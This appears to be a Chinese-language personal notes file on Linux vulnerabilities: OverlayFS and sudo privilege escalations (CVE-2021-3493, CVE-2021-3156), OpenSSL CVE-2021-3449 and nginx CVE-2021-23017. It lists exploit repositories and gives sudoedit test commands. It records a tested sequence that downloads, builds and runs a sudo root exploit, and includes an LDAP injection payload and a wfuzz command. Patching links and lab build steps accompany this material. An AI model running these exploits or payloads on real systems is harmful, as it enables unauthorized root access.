# linux 漏洞

## CVE-2021-3493

Ubuntu OverlayFS Local Privesc
https://ubuntu.com/security/CVE-2021-3493
Ubuntu 18.04 LTS (Bionic Beaver)	Released (4.15.0-142.146)

POC
https://github.com/briskets/CVE-2021-3493
https://github.com/Al1ex/LinuxEelvation/tree/master/CVE-2021-3493

这个漏洞很新很厉害，基本上都能成功

[CVE-2021-3493 Ubuntu内核OverlayFS权限逃逸漏洞分析](https://www.anquanke.com/post/id/240030)

[CVE-2021-3493 内核overlayfs提权漏洞分析](https://www.freebuf.com/vuls/275787.html)

## [Sudo缓冲区溢出漏洞（CVE-2021-3156）](http://www.nsfocus.net/vulndb/52555)

Sudo 1.8.2-1.8.31p2和1.9.0-1.9.5p1版本存在缓冲区溢出漏洞。
攻击者可通过“sudoedit -s”和以单个反斜杠字符结尾的命令行参数利用该漏洞获得系统root权限。

解决办法
[【安全通报】Sudo 堆缓冲区溢出漏洞 （CVE-2021-3156）](https://nosec.org/home/detail/4664.html)

[不用密码就能获取root权限？sudo被曝新漏洞](https://www.freebuf.com/news/262127.html)
视频显示
[源出处](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

[官方](https://www.sudo.ws/alerts/unescape_overflow.html)

### 测试确认/批量检测

https://www.bleepingcomputer.com/news/security/new-linux-sudo-flaw-lets-local-users-gain-root-privileges/

简单测试
sudoedit -s '\' 112233445566
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'

[cve-2021-3156-sudo堆溢出简单分析 ](https://bbs.pediy.com/thread-265669.htm)

测试版本:
https://github.com/sudo-project/sudo/archive/SUDO_1_9_5p1.tar.gz
https://github.com/sudo-project/sudo/archive/SUDO_1_8_27.tar.gz

现在版本:
Sudo version 1.8.27
Sudo version 1.8.21p2

阿里的 sudo 漏洞居然没有
但 https://www.exploit-db.com/ 有其它 POC

Sudo 1.8.25p - 'pwfeedback' Buffer Overflow
https://www.exploit-db.com/exploits/48052
sudo 1.8.27 - Security Bypass
https://www.exploit-db.com/exploits/47502
ptrace - Sudo Token Privilege Escalation (Metasploit)
https://www.exploit-db.com/exploits/47345

### exploit 利用

这个不知道能不能? 好像不行,回头看看是干什么的?
https://github.com/TH3xACE/SUDO_KILLER
https://github.com/TH3xACE/SUDO_KILLER/blob/6327a45cfb028d6140e10a6e799ac54af0711d14/SUDO_KILLERv2.0.6.sh

https://github.com/Mr-xn/Penetration_Testing_POC
这个只有两个可执行文件,好像不行
https://github.com/mr-r3b00t/CVE-2021-3156

这个只有一个1.c
https://github.com/reverse-ex/CVE-2021-3156

**这个亲测可以利用的**

电报群里发的：，但是只能用于特定的版本
对应: https://github.com/blasty/CVE-2021-3156
$ vagrant init ubuntu/focal64
$ vagrant up
$ vagrant ssh

$ wget https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz
$ tar -xzvf *.tar.gz
$ cd CVE-2021-3156
$ make
./sudo-hax-me-a-sandwich
可以用, 18.04.4也没有问题,gitlab版本更新了18.04.5
  available targets:
  ------------------------------------------------------------
    1) Ubuntu 18.04.4 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    2) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    3) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    4) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
另外的一个，不知道用法：
问题: 现在看 只有上面的版本可用

https://github.com/blasty/CVE-2021-3156

这个版本不行,应该是参数不对
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-52-generic x86_64)

使用 Ubuntu 18.04.5 
18.04.2 不可以
18.04.4 可以 
18.04.5 可以

好像现在也不行了，使用后要求输入sudo密码

再看下
https://github.com/d4rk6h05t/CVE-Exploits/tree/master/CVE-2021-3156
https://github.com/Al1ex/LinuxEelvation/tree/master/CVE-2021-3156_one_shot


其它有视频可以完成的:

https://twitter.com/r4j0x00/status/1355489323794108417
https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156

https://github.com/stong/CVE-2021-3156
https://twitter.com/gf_256/status/1355354178588180481

这个总结好几个能用的: 注:我和上面的三个一样
https://github.com/ltfafei/CVE-2021-3156/

twitter 视频模糊

[Twitter视频下载器](https://www.savetweetvid.com/zh)

### 修复:

https://omvapt.com/blog/how-to-update-sudo-packages-manually-to-fix-the-buffer-overflow-vulnerability-cve-2021-3156how-to-update-sudo-packages-manually-to-fix-the-vulnerability-sudo-flaw-lets-linux-users-run-commands-as-roo/

https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu1604_amd64.deb
https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu1804_amd64.deb
https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu2004_amd64.deb

sudo gdebi sudo_1.9.5-3_ubu2004_amd64.deb 

新版本下载: https://www.sudo.ws/download.html

修复 ansible
https://github.com/ymrsmns/CVE-2021-3156

https://s4-cs-pub-std.oss-cn-hangzhou.aliyuncs.com/chat_upload/tid613/image_1606884484072_sqc34.jpg
https://s4-cs-pub-std.oss-cn-hangzhou.aliyuncs.com/chat_upload/tid5261/image_1611839171605_qga5o.jpg

### 原理研究:

https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156

AFL模糊器(American Fuzzy lop)

[AFL实战：测试sudo提权漏洞CVE-2021-3156](https://netsecurity.51cto.com/art/202101/643772.htm#topx)
> 假设并行运行了4个实例，大约2小时的CPU时间。
> 通过2小时的CPU时间测试，就可以在setuid中找到严重的安全漏洞

视频讲解
https://github.com/mbcrump/CVE-2021-3156
https://www.youtube.com/watch?v=iRIXXUNkgAM
00:00 - Introduction
01:29 - What's a CVE?
02:22 - What's the bug?
05:30 - Exploit shown in action
13:07 - Sudo versions affected
13:48 - WSL Windows Subsystem for Linux
15:11 - Detecting if you are vulnerable through sudo (WSL)
19:21 - Detecting if you are vulnerable through sudo (Ubuntu)
20:53 - Detecting if you are vulnerable through commands
24:58 - What to do if you are running K8s or containers
27:54 - Examine Sudo versions
28:30 - Patching WSL 
30:17 - Patching Ubuntu 
32:09 - Where can I get exploit.c? 
33:59 - Patching Ubuntu (part 2)
38:10 - Patching WSL (part 2)
46:35 - GitHub search results
47:28 - Patching WSL (part 3)

## openssl cve-2021-3449

https://github.com/terorie/cve-2021-3449
https://www.openssl.org/news/secadv/20210325.txt

https://github.com/terorie/cve-2021-3449.git
openssl version -v
openssl version -a
腾讯云上并没有显示到底是什么补丁版本

vulmon分数有点低
https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-3449

阿里
您好，跟后端核实，slb 这边不受这两个漏洞的影响。SLB这边关闭了 重协商。
怎么测试？
  按道理，我可以重复发这个请求，
检测服务器是否开启重协商功能（用于CVE-2011-1473漏洞检测）
https://blog.csdn.net/weixin_39078334/article/details/111300194

tls 禁用重协商_白话SSL/TLS默认重协商漏洞原理与安全重协商对抗机制 - 全球可信SSL数字证书解决方案-INFINISIGN...
https://blog.csdn.net/weixin_42437067/article/details/111955777

TLS协议深入
https://xiaochai.github.io/2020/07/05/tls/

CVE-2021-28966: Path traversal in Tempfile on Windows | 只在windows生效
https://www.ruby-lang.org/en/news/2021/04/05/tempfile-path-traversal-on-windows-cve-2021-28966/

https://academy.hoppersroppers.org/mod/assign/view.php?id=679

浅谈LDAP注入攻击
https://www.anquanke.com/post/id/212186
chrome 插件： hackbar
  username=admin' or 1=1
  [Hackbar 2.3.1插件许可证限制绕过](https://cloud.tencent.com/developer/article/1672156)
  2.1.3后 收费，这是以前的版本 https://github.com/Mr-xn/hackbar2.1.3
  [Chrome安装Hackbar插件](https://blog.csdn.net/weixin_41182861/article/details/107689926)
  有开源的版本
  https://github.com/0140454/hackbar
  https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?hl=zh-CN
  得看看怎么用
wfuzz -c --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w special-chars.txt 10.10.10.122/login.php
  kali 自带
  stoken工具导入token
  echo 285449490011357156531651545652335570713167411445727140604172141456711102716717000 > token.txt
  stoken import --file=token.txt
  apt install stoken

https://githubmemory.com/repo/trapp3rhat/LDAP-injection

## nginx

[Nginx SSL 安全配置最佳实践.](https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f)
[加强 Nginx 的 SSL 安全](https://www.oschina.net/translate/strong_ssl_security_on_nginx?cmp)
[ssl - 在Ubuntu 16和Nginx中禁用Diffie-Hellman(DH) key](https://www.coder.work/article/4023104)
[Nginx漏洞修复：SSL/TLS 服务器瞬时 Diffie-Hellman 公共密钥过弱](https://www.cnblogs.com/-wenli/p/13391201.html)
[加强 Nginx的SSL 安全](https://cloud.tencent.com/developer/news/305996)
[SQL注入之sqli-labs（Less7-22）](https://www.freebuf.com/articles/web/274059.html)
[Nginx曝DNS解析器Off-by-One堆写入高危漏洞CVE-2021-23017](https://www.freebuf.com/vuls/274503.html)
[CVE-2021-23017：nginx DNS解析漏洞PoC公开](https://www.freebuf.com/vuls/276543.html)

https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py

https://www.valgrind.org/
Valgrind是一款用于内存调试、内存泄漏检测以及性能分析的软件开发工具

https://www.valgrind.org/downloads/current.html
https://sourceware.org/pub/valgrind/valgrind-3.17.0.tar.bz2

```bash
 cd valgrind
  ./autogen.sh
  ./configure --prefix=...
  make
  make install
  valgrind --trace-children=yes /usr/sbin/nginx -p ../runtime -c reverse-proxy.conf
  # 报错,64/32位的问题
```

/home/kali/lab/cve-2021-23017/access.log
sudo nginx -c /home/kali/lab/cve-2021-23017/reverse-proxy.conf

sudo apt-get install build-essential libtool
sudo apt-get update
#安装依赖：gcc、g++依赖库
sudo apt-get install build-essential libtool -y
#安装 pcre依赖库（http://www.pcre.org/）
sudo apt-get install libpcre3 libpcre3-dev -y
#安装 zlib依赖库（http://www.zlib.net）
sudo apt-get install zlib1g-dev -y
#安装ssl依赖库
sudo apt-get install openssl -y

./configure
sudo make
sudo make install

这个会手动编译得更多模块
Ubuntu 18.04 编译安装 nginx
https://blog.csdn.net/yuxiaomin886/article/details/103784918

./configure --prefix=/usr/local/nginx \
            --sbin-path=/usr/sbin/nginx \
            --conf-path=/etc/nginx/nginx.conf \
            --user=nginx \
            --group=nginx \
            --pid-path=/var/run/nginx.pid \
            --lock-path=/var/run/nginx.lock \
            --error-log-path=/var/log/nginx/error.log \
            --http-log-path=/var/log/nginx/access.log \
            --with-select_module \
            --with-poll_module \
            --with-threads \
            --with-file-aio \
            --with-http_ssl_module \
            --with-http_v2_module \
            --with-http_realip_module \
            --with-http_addition_module \
            --with-http_sub_module \
            --with-http_dav_module \
            --with-http_flv_module \
            --with-http_mp4_module \
            --with-http_gunzip_module \
            --with-http_gzip_static_module \
            --with-http_auth_request_module \
            --with-http_random_index_module \
            --with-http_secure_link_module \
            --with-http_degradation_module \
            --with-http_slice_module \
            --with-http_stub_status_module \
            --with-mail=dynamic \
            --with-mail_ssl_module \
            --with-stream \
            --with-stream_ssl_module \
            --with-stream_realip_module \
            --with-stream_ssl_preread_module \
            --with-compat \
            --with-pcre=../pcre-8.42 \ 
            --with-pcre-jit \
            --with-zlib=../zlib-1.2.11 \
            --with-openssl=../openssl-1.1.1a \
            --with-openssl-opt=no-nextprotoneg \
            --with-debug



Ubuntu18.04手动编译安装nginx
https://blog.csdn.net/A156348933/article/details/85335089